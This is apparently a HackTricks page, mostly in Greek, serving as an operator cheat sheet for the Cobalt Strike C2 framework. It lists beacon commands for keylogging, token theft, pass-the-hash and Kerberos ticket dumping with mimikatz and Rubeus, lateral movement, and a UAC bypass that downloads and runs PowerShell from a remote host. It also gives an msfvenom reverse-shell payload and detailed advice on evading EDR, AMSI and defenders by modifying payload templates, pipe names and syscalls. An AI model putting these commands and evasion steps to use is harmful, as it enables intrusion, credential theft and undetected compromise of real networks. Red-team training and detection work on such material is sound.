# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` έπειτα μπορείς να επιλέξεις πού θα γίνεται η ακρόαση, ποιο είδος beacon θα χρησιμοποιηθεί (http, dns, smb...) και άλλα.

### Peer2Peer Listeners

Τα beacons αυτών των listeners δεν χρειάζεται να επικοινωνούν απευθείας με το C2· μπορούν να επικοινωνούν μαζί του μέσω άλλων beacons.

`Cobalt Strike -> Listeners -> Add/Edit` έπειτα πρέπει να επιλέξεις τα TCP ή SMB beacons

* Το **TCP beacon θα ρυθμίσει έναν listener στη θύρα που έχει επιλεγεί**. Για να συνδεθείς σε ένα TCP beacon, χρησιμοποίησε την εντολή `connect <ip> <port>` από ένα άλλο beacon
* Το **smb beacon θα ακούει σε ένα pipename με το επιλεγμένο όνομα**. Για να συνδεθείς σε ένα SMB beacon, πρέπει να χρησιμοποιήσεις την εντολή `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** για αρχεία HTA
* **`MS Office Macro`** για ένα έγγραφο Office με macro
* **`Windows Executable`** για ένα .exe, .dll ή service .exe
* **`Windows Executable (S)`** για ένα **stageless** .exe, .dll ή service .exe (καλύτερα stageless από staged, με λιγότερα IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Αυτό θα δημιουργήσει ένα script/executable για τη λήψη του beacon από το Cobalt Strike σε μορφές όπως: bitsadmin, exe, powershell και python

#### Host Payloads

Αν έχεις ήδη το αρχείο που θέλεις να φιλοξενήσεις σε έναν web server, πήγαινε στο `Attacks -> Web Drive-by -> Host File` και επίλεξε το αρχείο προς φιλοξενία και τη ρύθμιση του web server.

### Beacon Options

<details>
<summary>Επιλογές και εντολές Beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Ένα custom agent χρειάζεται μόνο να μιλά το HTTP/S protocol του Cobalt Strike Team Server (default malleable C2 profile) για να κάνει register/check-in και να λαμβάνει tasks. Υλοποιήστε τα ίδια URIs/headers/metadata crypto που ορίζονται στο profile, ώστε να επαναχρησιμοποιήσετε το Cobalt Strike UI για tasking και output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Ένα Aggressor Script (π.χ. `CustomBeacon.cna`) μπορεί να περιλάβει payload generation για το non-Windows beacon, ώστε οι operators να επιλέγουν τον listener και να παράγουν ELF payloads απευθείας από το GUI.
- Παραδείγματα Linux task handlers που εκτίθενται στο Team Server: `sleep`, `cd`, `pwd`, `shell` (εκτέλεση arbitrary commands), `ls`, `upload`, `download` και `exit`. Αυτά αντιστοιχούν στα task IDs που αναμένει το Team Server και πρέπει να υλοποιηθούν server-side, ώστε να επιστρέφουν output στη σωστή μορφή.
- Η υποστήριξη BOF στο Linux μπορεί να προστεθεί με φόρτωση Beacon Object Files in-process μέσω του [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (υποστηρίζει επίσης Outflank-style BOFs), επιτρέποντας modular post-exploitation να εκτελείται μέσα στο context/privileges του implant χωρίς spawning νέων processes.<sup>[[2]](#references)[[3]](#references)</sup>
- Ενσωματώστε έναν SOCKS handler στο custom beacon, ώστε να διατηρήσετε parity στο pivoting με τα Windows Beacons: όταν ο operator εκτελεί `socks <port>`, το implant πρέπει να ανοίγει local proxy για να δρομολογεί τα operator tools μέσω του compromised Linux host προς τα internal networks.

## Opsec

### Execute-Assembly

Το **`execute-assembly`** χρησιμοποιεί ένα **sacrificial process** μέσω remote process injection για να εκτελέσει το υποδεικνυόμενο πρόγραμμα. Αυτό είναι πολύ noisy, επειδή για να γίνει inject σε ένα process χρησιμοποιούνται ορισμένα Win APIs, τα οποία ελέγχει κάθε EDR. Ωστόσο, υπάρχουν ορισμένα custom tools που μπορούν να χρησιμοποιηθούν για να φορτώσουν κάτι στο ίδιο process:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- Στο Cobalt Strike μπορείτε επίσης να χρησιμοποιήσετε BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Το agressor script `https://github.com/outflanknl/HelpColor` θα δημιουργήσει την εντολή `helpx` στο Cobalt Strike, η οποία θα προσθέτει χρώματα στις εντολές, υποδεικνύοντας αν είναι BOFs (πράσινο), αν είναι Frok&Run (κίτρινο) και παρόμοια, ή αν είναι ProcessExecution, injection ή παρόμοια (κόκκινο). Αυτό βοηθά να γνωρίζετε ποιες εντολές είναι πιο stealthy.

### Act as the user

Μπορείτε να ελέγξετε events όπως `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Ελέγξτε όλα τα interactive logons για να γνωρίζετε τις συνηθισμένες ώρες λειτουργίας.
- System EID 12,13 - Ελέγξτε τη συχνότητα shutdown/startup/sleep.
- Security EID 4624/4625 - Ελέγξτε τα inbound valid/invalid NTLM attempts.
- Security EID 4648 - Αυτό το event δημιουργείται όταν χρησιμοποιούνται plaintext credentials για logon. Αν το δημιούργησε ένα process, το binary ενδέχεται να έχει τα credentials σε clear text σε ένα config file ή μέσα στον κώδικα.

Όταν χρησιμοποιείτε `jump` από το cobalt strike, είναι προτιμότερο να χρησιμοποιείτε τη μέθοδο `wmi_msbuild`, ώστε το νέο process να φαίνεται πιο legit.

### Use computer accounts

Είναι συνηθισμένο οι defenders να ελέγχουν περίεργες συμπεριφορές που δημιουργούνται από users και να **εξαιρούν service accounts και computer accounts όπως το `*$` από το monitoring τους**. Θα μπορούσατε να χρησιμοποιήσετε αυτά τα accounts για lateral movement ή privilege escalation.

### Use stageless payloads

Τα stageless payloads είναι λιγότερο noisy από τα staged, επειδή δεν χρειάζεται να κάνουν download ένα δεύτερο stage από τον C2 server. Αυτό σημαίνει ότι δεν δημιουργούν network traffic μετά την αρχική σύνδεση, με αποτέλεσμα να είναι λιγότερο πιθανό να εντοπιστούν από network-based defenses.

### Tokens & Token Store

Να είστε προσεκτικοί όταν κλέβετε ή δημιουργείτε tokens, επειδή μπορεί να είναι δυνατό ένα EDR να enumerates όλα τα tokens όλων των threads και να βρει ένα **token που ανήκει σε διαφορετικό user** ή ακόμη και στο SYSTEM μέσα στο process.

Αυτό επιτρέπει την αποθήκευση tokens **ανά beacon**, ώστε να μην χρειάζεται να κλέβετε ξανά και ξανά το ίδιο token. Αυτό είναι χρήσιμο για lateral movement ή όταν χρειάζεται να χρησιμοποιήσετε ένα stolen token πολλές φορές:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Κατά το lateral movement, συνήθως είναι προτιμότερο να **κλέψετε ένα token αντί να δημιουργήσετε ένα νέο** ή να εκτελέσετε pass the hash attack.

### Guardrails

Το Cobalt Strike διαθέτει μια λειτουργία που ονομάζεται **Guardrails**, η οποία βοηθά στην αποτροπή χρήσης συγκεκριμένων commands ή actions που θα μπορούσαν να εντοπιστούν από defenders. Τα Guardrails μπορούν να ρυθμιστούν ώστε να μπλοκάρουν συγκεκριμένες εντολές, όπως `make_token`, `jump`, `remote-exec` και άλλες που χρησιμοποιούνται συνήθως για lateral movement ή privilege escalation.

Επιπλέον, το repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) περιέχει επίσης ορισμένους ελέγχους και ιδέες που θα μπορούσατε να εξετάσετε πριν εκτελέσετε ένα payload.

### Tickets encryption

Σε ένα AD, να είστε προσεκτικοί με το encryption των tickets. Από default, ορισμένα tools χρησιμοποιούν RC4 encryption για Kerberos tickets, το οποίο είναι λιγότερο ασφαλές από το AES encryption, ενώ από default τα up-to-date environments χρησιμοποιούν AES. Αυτό μπορεί να εντοπιστεί από defenders που κάνουν monitoring για weak encryption algorithms.

### Avoid Defaults

Όταν χρησιμοποιείτε το Cobalt Stricke, από default τα SMB pipes θα έχουν τα ονόματα `msagent_####` και `"status_####"`. Αλλάξτε αυτά τα ονόματα. Είναι δυνατό να ελέγξετε τα ονόματα των υπαρχόντων pipes από το Cobal Strike με την εντολή: `ls \\.\pipe\`

Επιπλέον, με SSH sessions δημιουργείται ένα pipe που ονομάζεται `\\.\pipe\postex_ssh_####`. Αλλάξτε το με `set ssh_pipename "<new_name>";`.

Επίσης, στο poext exploitation attack τα pipes `\\.\pipe\postex_####` μπορούν να τροποποιηθούν με `set pipename "<new_name>"`.

Στα Cobalt Strike profiles μπορείτε επίσης να τροποποιήσετε πράγματα όπως:

- Αποφυγή χρήσης του `rwx`
- Ο τρόπος λειτουργίας του process injection (ποια APIs θα χρησιμοποιούνται) στο block `process-inject {...}`
- Ο τρόπος λειτουργίας του "fork and run" στο block `post-ex {…}`
- Ο χρόνος sleep
- Το μέγιστο μέγεθος των binaries που θα φορτώνονται στη memory
- Το memory footprint και το DLL content με το block `stage {...}`
- Το network traffic

### Bypass memory scanning

Ορισμένα ERDs κάνουν scan τη memory για γνωστές malware signatures. Το Coblat Strike επιτρέπει την τροποποίηση της λειτουργίας `sleep_mask` ως BOF, η οποία θα μπορεί να κάνει encrypt το bacldoor στη memory.

### Noisy proc injections

Όταν γίνεται injection κώδικα σε ένα process, αυτό είναι συνήθως πολύ noisy, επειδή **κανένα κανονικό process συνήθως δεν εκτελεί αυτή την ενέργεια και επειδή οι τρόποι για να γίνει αυτό είναι πολύ περιορισμένοι**. Επομένως, θα μπορούσε να εντοπιστεί από behaviour-based detection systems. Επιπλέον, θα μπορούσε επίσης να εντοπιστεί από EDRs που κάνουν scan στο network για **threads τα οποία περιέχουν κώδικα που δεν υπάρχει στον disk** (παρόλο που processes όπως οι browsers, οι οποίοι χρησιμοποιούν JIT, το κάνουν συχνά). Παράδειγμα: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Κατά το spawning ενός νέου process, είναι σημαντικό να **διατηρείται μια κανονική σχέση parent-child** μεταξύ των processes, ώστε να αποφεύγεται ο εντοπισμός. Αν το svchost.exec εκτελεί το iexplorer.exe, θα φαίνεται ύποπτο, καθώς το svchost.exe δεν είναι parent του iexplorer.exe σε ένα κανονικό Windows environment.

Όταν γίνεται spawn ένα νέο beacon στο Cobalt Strike, από default δημιουργείται ένα process που χρησιμοποιεί το **`rundll32.exe`** για να εκτελέσει τον νέο listener. Αυτό δεν είναι ιδιαίτερα stealthy και μπορεί να εντοπιστεί εύκολα από EDRs. Επιπλέον, το `rundll32.exe` εκτελείται χωρίς args, γεγονός που το κάνει ακόμη πιο ύποπτο.

Με την ακόλουθη εντολή του Cobalt Strike μπορείτε να καθορίσετε διαφορετικό process για το spawning του νέου beacon, κάνοντάς το λιγότερο ανιχνεύσιμο:
```bash
spawnto x86 svchost.exe
```
Μπορείτε επίσης να αλλάξετε αυτήν τη ρύθμιση **`spawnto_x86` και `spawnto_x64`** σε ένα profile.

### Proxying traffic των attackers

Οι attackers μερικές φορές χρειάζεται να μπορούν να εκτελούν tools τοπικά, ακόμη και σε Linux machines, και να κάνουν την traffic των victims να φτάνει στο tool (π.χ. NTLM relay).

Επιπλέον, μερικές φορές, για να πραγματοποιήσουν μια επίθεση pass-the.hash ή pass-the-ticket, είναι πιο stealthy για τους attackers να **προσθέσουν αυτό το hash ή ticket στη δική τους διεργασία LSASS** τοπικά και, στη συνέχεια, να κάνουν pivot από αυτήν, αντί να τροποποιήσουν μια διεργασία LSASS σε machine ενός victim.

Ωστόσο, χρειάζεται να είστε **προσεκτικοί με την traffic που δημιουργείται**, καθώς μπορεί να στέλνετε uncommon traffic (kerberos;) από τη backdoor process σας. Για αυτό, θα μπορούσατε να κάνετε pivot σε μια browser process (αν και μπορεί να εντοπιστείτε inject-άροντας τον εαυτό σας σε μια process, οπότε σκεφτείτε έναν stealth τρόπο για να το κάνετε).


### Αποφυγή AVs

#### AV/AMSI/ETW Bypass

Ελέγξτε τη σελίδα:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Συνήθως, στο `/opt/cobaltstrike/artifact-kit`, μπορείτε να βρείτε τον κώδικα και τα pre-compiled templates (στο `/src-common`) των payloads που θα χρησιμοποιήσει το cobalt strike για να δημιουργήσει τα binary beacons.

Χρησιμοποιώντας το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με το generated backdoor (ή απλώς με το compiled template), μπορείτε να βρείτε τι προκαλεί το defender να ενεργοποιείται. Συνήθως είναι ένα string. Επομένως, μπορείτε απλώς να τροποποιήσετε τον κώδικα που δημιουργεί το backdoor, ώστε αυτό το string να μην εμφανίζεται στο τελικό binary.

Αφού τροποποιήσετε τον κώδικα, απλώς εκτελέστε το `./build.sh` από τον ίδιο κατάλογο και αντιγράψτε τον φάκελο `dist-pipe/` στο Windows client, στη θέση `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Μην ξεχάσετε να φορτώσετε το aggressive script `dist-pipe\artifact.cna`, ώστε να υποδείξετε στο Cobalt Strike να χρησιμοποιεί τους resources από τον δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.

#### Resource Kit

Ο φάκελος ResourceKit περιέχει τα templates για τα script-based payloads του Cobalt Strike, συμπεριλαμβανομένων των PowerShell, VBA και HTA.

Χρησιμοποιώντας το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με τα templates, μπορείτε να εντοπίσετε τι δεν αρέσει στο defender (σε αυτήν την περίπτωση το AMSI) και να το τροποποιήσετε:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Τροποποιώντας τις εντοπισμένες γραμμές, μπορεί κανείς να δημιουργήσει ένα template που δεν θα ανιχνεύεται.

Μην ξεχάσετε να φορτώσετε το aggressive script `ResourceKit\resources.cna`, ώστε να υποδείξετε στο Cobalt Strike να χρησιμοποιεί τους resources από τον δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.

#### Function hooks | Syscall

Το Function hooking είναι μια πολύ συνηθισμένη μέθοδος των ERDs για την ανίχνευση κακόβουλης δραστηριότητας. Το Cobalt Strike επιτρέπει την παράκαμψη αυτών των hooks μέσω **syscalls**, αντί για τις τυπικές κλήσεις του Windows API, χρησιμοποιώντας τη ρύθμιση **`None`**, ή τη χρήση της έκδοσης `Nt*` μιας function με τη ρύθμιση **`Direct`**, ή απλώς την υπερπήδηση της function `Nt*` με την επιλογή **`Indirect`** στο malleable profile. Ανάλογα με το σύστημα, μία επιλογή μπορεί να είναι πιο stealth από κάποια άλλη.

Αυτό μπορεί να ρυθμιστεί στο profile ή με την εντολή **`syscall-method`**.

Ωστόσο, αυτό μπορεί επίσης να είναι noisy.

Μία επιλογή που παρέχει το Cobalt Strike για την παράκαμψη των function hooks είναι η αφαίρεση αυτών των hooks με το [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Μπορείτε επίσης να ελέγξετε ποιες functions είναι hooked με τα [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ή [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Διάφορες εντολές του Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Αναφορές

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
